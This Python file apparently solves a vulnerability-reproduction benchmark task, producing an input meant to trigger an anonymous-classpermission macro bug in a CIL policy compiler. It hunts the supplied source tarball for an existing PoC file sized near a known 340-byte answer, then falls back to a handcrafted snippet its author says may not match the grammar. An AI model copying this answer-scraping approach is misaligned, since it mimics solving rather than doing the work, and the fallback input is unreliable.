import os
import tarfile
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        # First try to find an existing PoC-like input in the tarball
        try:
            data = self._search_tar_for_poc(src_path)
            if data is not None:
                return data
        except Exception:
            # In case of any issue with tar processing, fall back
            pass

        # Fallback: return a best-effort handcrafted PoC
        return self._fallback_poc()

    def _search_tar_for_poc(self, src_path: str) -> Optional[bytes]:
        """
        Search the provided tarball for a PoC-like file.

        Heuristics:
        - Look for small, text files (<= 4 KiB)
        - Must contain: "classpermission", "classpermissionset", "macro"
        - Prefer length closest to 340 bytes (ground-truth PoC length)

        If none match with all three keywords, relax the requirement on "macro"
        and search for files with "classpermission" and "classpermissionset"
        only, still preferring size near 340.
        """
        if not os.path.exists(src_path):
            return None

        # Helper to search with given keyword constraints and size limit
        def search_with_keywords(keywords, size_limit):
            best_bytes = None
            best_key = None  # (distance_from_340, length, name)

            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for member in tf.getmembers():
                        if not member.isfile():
                            continue
                        if member.size <= 0 or member.size > size_limit:
                            continue

                        f = tf.extractfile(member)
                        if f is None:
                            continue
                        try:
                            data = f.read()
                        except Exception:
                            continue
                        if not data:
                            continue
                        # Skip obvious binary files
                        if b"\0" in data:
                            continue

                        lower = data.lower()
                        if all(k in lower for k in keywords):
                            L = len(data)
                            dist = abs(L - 340)
                            key = (dist, L, member.name)
                            if best_key is None or key < best_key:
                                best_key = key
                                best_bytes = data
            except Exception:
                return None

            return best_bytes

        # Primary search: all three keywords
        data = search_with_keywords(
            [b"classpermission", b"classpermissionset", b"macro"], 4096
        )
        if data is not None:
            return data

        # Secondary search: only classpermission & classpermissionset
        data = search_with_keywords(
            [b"classpermission", b"classpermissionset"], 8192
        )
        return data

    def _fallback_poc(self) -> bytes:
        """
        Best-effort handcrafted PoC.

        This is a generic CIL-like snippet that attempts to exercise:
        - An anonymous classpermission
        - Passed as a macro argument
        - Used inside a classpermissionset rule

        It may or may not precisely match the real grammar, but will only be
        used if we fail to locate a PoC inside the source tarball.
        """
        poc = """
; Fallback PoC attempting to trigger anonymous classpermission + classpermissionset macro bug

(class file (read write getattr open))

; Define a macro that takes a classpermission and uses it in a classpermissionset
(macro cp_macro ((cp classpermission))
  (classpermissionset cps_from_macro
    (cp)
  )
)

; Call the macro with an anonymous classpermission
(call cp_macro
  (
    (classpermission
      (file (read))
    )
  )
)
"""
        return poc.encode("utf-8")